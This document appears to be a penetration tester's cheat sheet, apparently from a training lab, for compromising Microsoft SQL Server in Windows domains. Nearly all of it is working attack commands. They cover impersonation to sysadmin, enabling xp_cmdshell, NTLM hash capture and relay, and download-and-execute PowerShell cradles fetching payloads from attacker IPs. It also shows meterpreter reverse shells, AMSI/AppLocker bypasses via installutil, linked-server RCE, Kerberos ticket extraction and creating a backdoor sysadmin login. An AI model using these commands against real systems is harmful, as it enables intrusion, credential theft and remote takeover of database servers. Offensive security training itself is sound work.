### Example Queries

    SELECT name FROM master..sysdatabases;
    sELECT sYSTEM_USER;
    select user_name();
    SELECT IS_SRVROLEMEMBER('public');
    SELECT IS_SRVROLEMEMBER('dbcreator');
    SELECT IS_SRVROLEMEMBER('diskadmin');
    SELECT IS_SRVROLEMEMBER('bulkadmin');
    SELECT IS_SRVROLEMEMBER('setupadmin');
    SELECT IS_SRVROLEMEMBER('processadmin');
    SELECT IS_SRVROLEMEMBER('securityadmin');
    SELECT IS_SRVROLEMEMBER('serveradmin');
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
        //**dbo can impersonate any user, even if not listed? - try it!
    SELECT STRING_AGG(d.name, ', ') FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id INNER JOIN sys.databases d ON suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1;
    sELECT sYSTEM_USER;
    ****EXECUTE AS LOGIN = 'sa';
    sELECT sYSTEM_USER;
    sELECT user_name();
    use msdb; EXECUTE AS USER = 'dbo';
    sELECT user_name();

    EXEC sp_linkedservers;

    //check:  SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    EXEC xp_cmdshell whoami
    EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
    ...


    #Get table names
    SELECT * FROM music.INFORMATION_SCHEMA.TABLES;
    select * from music.dbo.users;

    #List Linked Servers
    EXEC sp_linkedservers
    SELECT * FROM sys.servers;

    #List users
    select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

    #Create user with sysadmin privs
    CREATE LOGIN bob WITH PASSWORD = 'abc123!'
    EXEC sp_addsrvrolemember 'bob', 'sysadmin'

    #NTLM disclosure/relay:
    EXEC master..xp_dirtree "\\192.168.49.121\test"


    //Linked Server Enumeration:
        EXEC sp_linkedservers;
        select v from openquery("SQL07", 'select @@version as v');
        //or: select * from openquery("SQL05", 'select @@version');
        select v from openquery("SQL03", 'select system_user as v');
        select v from openquery("SQL03", 'select user_name() as v');
        select v from openquery("SQL03", 'select IS_SRVROLEMEMBER(''sysadmin'') as v');
        select * from openquery("SQL03", 'select name FROM master..sysdatabases');
        select * from openquery("SQL03", 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''');
        select * from openquery("SQL03", 'SELECT STRING_AGG(d.name, '', '') FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id INNER JOIN sys.databases d ON suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1');
        select * from openquery("SQL03", 'EXEC sp_linkedservers');
        select * from openquery("SQL03", 'SELECT * FROM sys.servers');
        select * from openquery("SQL03", 'select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then ''Disabled'' else ''Enabled'' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in (''G'', ''R'') order by sp.name');
    //Linked Server NTLM:
        sudo responder -I tun0
        select * from openquery("SQL03", 'EXEC master..xp_dirtree "\\192.168.49.121\test"');
    //RCE on Linked Server:
        EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT "SQL03";
        EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "SQL03";
        EXEC ('xp_cmdshell whoami') AT "SQL03";
        //Shell Method 1:
            EXEC ('xp_cmdshell ''reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f && \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe''') AT "SQL03";
        //Shell Method 2:   
            EXEC ('xp_cmdshell ''powershell -c wget http://192.168.49.121/file4.txt -outfile c:\windows\tasks\enc2.txt''') AT "SQL03";
            EXEC ('xp_cmdshell ''certutil -decode c:\windows\tasks\enc2.txt c:\windows\tasks\Hollow.csproj''') AT "SQL03";
            EXEC ('xp_cmdshell ''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\Hollow.csproj''') AT "SQL03";   

### Enumeration & Exploitation

    //Enumeration:
        //port 1433 by default
        //query DC for all registered SPNs related to MS SQL
            setspn -T corp1 -Q MSSQLSvc/*
            . .\GetUserSPNs.ps1     //another way
            //also note the service account it's running under
            
    //Roles:
        select system_user; select user_name(); SELECT IS_SRVROLEMEMBER('public'); SELECT IS_SRVROLEMEMBER('sysadmin');
        
    //MSSQLSvc Account Hash Disclosure via UNC Path Injection:
        SQLSMBHash.exe - EXEC master..xp_dirtree "\\192.168.49.121\test";
            //catch: sudo responder -I tun0
            //crack:  hashcat -m 5600 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force
        //NTLMv2 (Net-NTLM) hash disclosure via xp_dirtree function that tries to list contents of a remote SMB share
        //NTLM authentication is used instead of Kerberos if IP is provided (not domain name)
        //other functions can be used too - https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e
        //can be done via unprivileged user - and leaks the privileged database user's hash; catch w/ responder
        //try to crack hash - can't do PTH w/ NTLMv2 - but can relay!
        //Relay the Hash:
            //possible w/ NTLMv2 (unless SMB signing is enabled - usually only on DCs) - only if the service account exists on both systems
            ex. with PS shellcode runner:
                pwsh
                    $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.226/run.txt') | IEX"
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
                    $EncodedText = [Convert]::ToBase64String($bytes)
                    $EncodedText
                sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.189.6 -c 'powershell -enc ......=='
                //then initiate the sql command (SQLSMBHash.exe) and ensure multi/handler is running (worked w/ 64bit shellcode)
            //Another Example:
                sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'
                //omit the '-c' to perform a secretsdump
            //**Hollower Example:
                sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.173.152 -c 'ping -n 2 192.168.49.121'
                sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.173.152 -c 'bitsadmin /Transfer myJob http://192.168.49.121/file4.txt c:\windows\tasks\enc2.txt'
                sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.173.152 -c 'certutil -decode c:\windows\tasks\enc2.txt c:\windows\tasks\Hollow.csproj'
                sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.173.152 -c 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\Hollow.csproj'

    //Escalation & RCE:
        //Privilege Escalation:
            'Execute As' statement - execute in context of another user - requires Impersonate permission (not default)
            -Type 1: EXECUTE AS LOGIN:
                SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
                    //gives all logins that allow impersonation (but not who is allowed to do it)
            -Type 2: EXECUTE AS USER:
                2 prereqs: 
                    //impersonation must have been granted to our user for a different user that has additional role memberships, preferably the sysadmin role.
                    //To fully compromise the database server, the database user we impersonate must be in a database that has the TRUSTWORTHY property set.
                        //The only native database with the TRUSTWORTHY property enabled is msdb.
        //Code Execution: 
            //see examples in SQL.exe
            -Method 1: xp_cmdshell
                //requires sysadmin role membership
                //disabled by default since MSSQL 2005 - BUT sysadmin role (sa) allows us to re-enable it
            -Method 2: sp_OACreate
                //requires sysadmin role membership
                //uses Object Linking and Embedding (OLE) and Wscript
                //blind execution - results aren't returned
                //Shell example:
                    pwsh
                        $text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/run.txt') | IEX"
                        $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
                        $EncodedText = [Convert]::ToBase64String($bytes)
                        $EncodedText
                    "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc ...';";
                    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1
            -Method 3: Custom Assemblies:
                //importing a managed DLL and calling RCE methods - requires database to have TRUSTWORTHY property set
                cmdExec.dll
                //can import dll from disk (or smb if 2016 or earlier) - but better method is putting hex string of file contents directly in query
                //if running multiple times, requires drop procedure & drop assembly first
                //hex converter:
                    $assemblyFile = "\\192.168.45.210\visualstudio\SQL\CustomSQLRCEAssembly\bin\x64\Release\cmdExec.dll"
                    $stringBuilder = New-Object -Type System.Text.StringBuilder 
                    $fileStream = [IO.File]::OpenRead($assemblyFile)
                    while (($byte = $fileStream.ReadByte()) -gt -1) {
                    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
                    }
                    $stringBuilder.ToString() -join ""

    //Linked SQL Servers:
            ***links might only be executable by certain user accounts!
            //execution context can be dynamic or static (allowing for privesc); not bidirectional by default
            //Step 1: check linked servers with sp_linkedserver (nonpriv)
            //Step 2: perform query on linked server - ex. select v from openquery("dc01", 'select @@version as v');
                //config statements:  ex. EXEC ('sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT DC01
            //default database is 'master'; default with TRUSTWORTHY property enabled is 'msdb'
        ****Check for linked servers from the linked server (see if it links back to you) - if so, check user and use for privesc!
            EXEC ('sp_linkedservers') AT DC01
            select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')
            EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
        //Link crawling w/ MSF:
            msf > use exploit/windows/mssql/mssql_linkcrawler
            msf exploit(windows/mssql/mssql_linkcrawler) > set RHOSTS 192.168.1.11
            msf exploit(windows/mssql/mssql_linkcrawler) > set USERNAME sa
            msf exploit(windows/mssql/mssql_linkcrawler) > set PASSWORD Passw0rd!
            msf exploit(windows/mssql/mssql_linkcrawler) > set DEPLOY true
            msf exploit(windows/mssql/mssql_linkcrawler) > set VERBOSE true
            msf exploit(windows/mssql/mssql_linkcrawler) > run

    //Enumeration w/ DAFT.exe:
        View non-default databases:  \\192.168.45.210\visualstudio\DAFT\DAFT\bin\x64\Release\DAFT.exe -i "appsrv01.corp1.com" -m "database" -n
        Sensitive data:  \\192.168.45.210\visualstudio\DAFT\DAFT\bin\x64\Release\DAFT.exe -i "appsrv01.corp1.com" -m "ColumnSampleData" --SearchKeywords="password,passwd,secret,licence,ssn" --SampleSize=5
        OS command:  \\192.168.45.210\visualstudio\DAFT\DAFT\bin\x64\Release\DAFT.exe -i "dc01.corp1.com" -m "OSCmd" -q "whoami"

    //Enumeration w/ ESC:
        //msbuild option for running:  C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe esc.csproj
        discover domainspn; show discovered
        set targetall enabled; show settings
        check access; show access
        set instance dc01.corp1.com
        select @@version
        go
        list databases
        check defaultpw; check loginaspw
        run oscmd whoami
        list links
            //or: EXEC sp_linkedservers;
                    go
        list logins; list rolemembers; list privs
        check uncinject <IP>

    //**Enumeration w/ SQLRecon:
        \\192.168.45.210\visualstudio\SQLRecon.exe ...
            /enum:sqlspns
            //current token:  /a:WinToken /h:DC01 /m:whoami
            //domain creds:  /a:WinDomain /d:corp1.com /h:DC01 /u:administrator /p:lab /m:whoami
            //local creds:  /a:Local /h:SQL01 /u:sa /p:Password123 /m:whoami
            /auth:WinToken /host:DC01 /module:info
                /module:users
                /module:databases
                    /module:tables /db:Payments
                        /module:columns /db:Payments /table:cc
                            /m:rows /db:AdventureWorks /table:SalesLT.Customer
                /database:Payments /module:search /keyword:password
                /database:Payments /module:query /command:"select * from cc"
                /module:smb /rhost:\\172.16.99.37\someshare
            * /module:links
                    /l:SQL02 /m:lwhoami
                    /l:SQL02 /m:lusers
                    /l:SQL02 /m:ldatabases
                        ...
                    /m:lsmb /rhost:\\172.16.99.37\someshare
                    /l:SQL03 /m:llinks
                    /l:SQL02 /m:lenablexp
                        /l:SQL02 /m:lxpcmd /c:"c:\temp\payload.exe"         //blind execution
                        ... same as below
            * /module:impersonate
                    /i:sa /m:iwhoami
                    /i:sa /m:iusers
                    /i:sa /m:idatabases
                        /i:sa /m:itables /db:AdventureWorks
                            /i:sa /m:icolumns /db:AdventureWorks /table:Customer
                                /i:sa /m:irows /db:Payments /table:cc
                        /database:AdventureWorks /i:sa /m:isearch /keyword:add
                        /i:sa /m:iquery /c:"select @@version"
                        /i:sa /m:ilinks
                    **Enable/Disable stuff below, just preface /m name with 'i' and give /i:sa       
                    **Shell ex.:
                        \\192.168.45.210\visualstudio\SQLRecon.exe /a:WinToken /h:DC01 /i:sa /m:iclr /dll:"http://192.168.45.210/cmdExec2.dll" /function:cmdExec2
            Enable/Disable stuff:
                /module:checkrpc
                    /module:enablerpc /rhost:SQL02
                    /module:disablerpc /rhost:SQL02
                /module:enablexp
                    /module:disablexp
                    /module:xpcmd /command:"c:\temp\payload.exe"
                /module:enableole
                    /module:disableole
                    /module:olecmd /command:notepad.exe
                /module:enableclr
                    /module:disableclr
                    /module:clr /dll:"C:\Users\jsmith\Desktop\sql.dll" /function:CustomFunctionName
                    /module:clr /dll:"https://tempbucket1.s3.us-east-1.amazonaws.com/sql.dll?<snipped>" /function:CustomFunctionName
                /module:adsi /rhost:linkadsi /lport:49100


    //Metasploit:
        use admin/mssql/mssql_enum
        use admin/mssql/mssql_enum_sql_logins
        use auxiliary/scanner/mssql/mssql_schemadump
        use exploit/windows/mssql/mssql_linkcrawler
        //Login Bruteforcer:  use auxiliary/scanner/mssql/mssql_login; set user_file /root/users.txt; set pass_file /root/pass.txt
        //*Test Impersonation: use auxiliary/widows/mssql/mssql_escalate_execute_as; set rhosts 192.168.1.146; set username lowpriv; set password Password@1


    //Enumeration w/ PowerUpSQL.ps1:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/PowerUpSQL.ps1') | IEX
        Get-SQLInstanceDomain -Verbose
        Get-SQLServerInfo -Verbose -Instance sql07
        $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}
        $Targets | Get-SQLQuery -Verbose -Query "Select @@version"
        //Bypass:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /cmd="echo '#######AMSIBYPASS#######'; (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/amsi.txt') | IEX; echo '#######POWERUPSQL#######'; (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/PowerUpSQL.ps1') | IEX; Get-SQLServerInfo -Verbose -Instance sql07 | out-file -filepath 'c:\windows\tasks\q.txt'" /U c:\windows\tasks\S.exe

    //Enumeration manually w/ SQLQuery.ps1:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/SQLQuery.ps1') | IEX
        //Bypass Method:
            upload /home/kali/data/PSApplockerBypass/InstallUtilBypass2/bin/x64/Release/InstallUtilBypass2.exe c:/windows/tasks/S.exe
            C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /cmd="echo '#######SQLQuery.ps1#######'; (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/SQLQuery.ps1') | IEX > q.txt; type q.txt" /U c:\windows\tasks\S.exe


    //Enum from Linux - mssqlclient.py:
        ////socks:
            use multi/manage/autoroute; set session 1; exploit
            use auxiliary/server/socks_proxy; set srvhost 127.0.0.1; exploit -j         //to stop: jobs; kill 0
            sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
        proxychains mssqlclient.py -windows-auth tricky.com/will:fdsfssdfDFG4@172.16.173.151


    //Request TGS & Connect via Kerberos Ticket from Linux:
        setspn -T tricky.com -Q MSSQLSvc/*
        load kiwi
        kiwi_cmd "kerberos::list"
        kiwi_cmd "kerberos::ask /target:MSSQLSvc/sql05.tricky.com:1433"
        kiwi_cmd "kerberos::list /export"

        echo -n "ABC...==" | base64 -d > /tmp/ticket
        ticketConverter.py /tmp/ticket /tmp/ticket.ccache
        export KRB5CCNAME=/tmp/ticket.ccache
        sudo echo "172.16.173.151 sql05.tricky.com" >> /etc/hosts
        proxychains mssqlclient.py -k -dc-ip 172.16.173.150 sql05.tricky.com -debug


    //**Method to Recover Linked Server Hash:
        1. Enable DAC Mode:
            https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/
        2. Run .ps1 Script:
            https://www.richardswinbank.net/admin/extract_linked_server_passwords


    //Configuration Troubleshooting:
        //Give User Sysadmin SQL Role (from local admin access):
            sc query | findstr /i sql
            select @@ServiceName;       //get named instance (for sqlservr cmd)
            net stop MSSQL$SQLEXPRESS
            cd C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn
            sqlservr -m"SQLCMD" -s SQLEXPRESS
            //another window:
                sqlcmd
                    create login [DEV\SQLSVC01] from windows;
                    go
                    ALTER SERVER ROLE [sysadmin] ADD MEMBER [DEV\SQLSVC01];
                    go
            net start MSSQL$SQLEXPRESS   
        //Add Login Mapping for Another Server:
            select * from sys.servers;
            select * from sys.sql_logins;
            ##via query:  EXEC master.dbo.sp_addremotelogin @remoteserver = 'SQL03', @loginame = 'sa', @remotename = 'sa';
            ***via manual:  Server Objects > Linked Servers > SQL03 > Properties > Security > Check the Impersonate Box
        //Configure Remote Server for RPC:
            Server Objects > Linked Servers > SQL03 > Properties > Server Options > Enable RPC Out
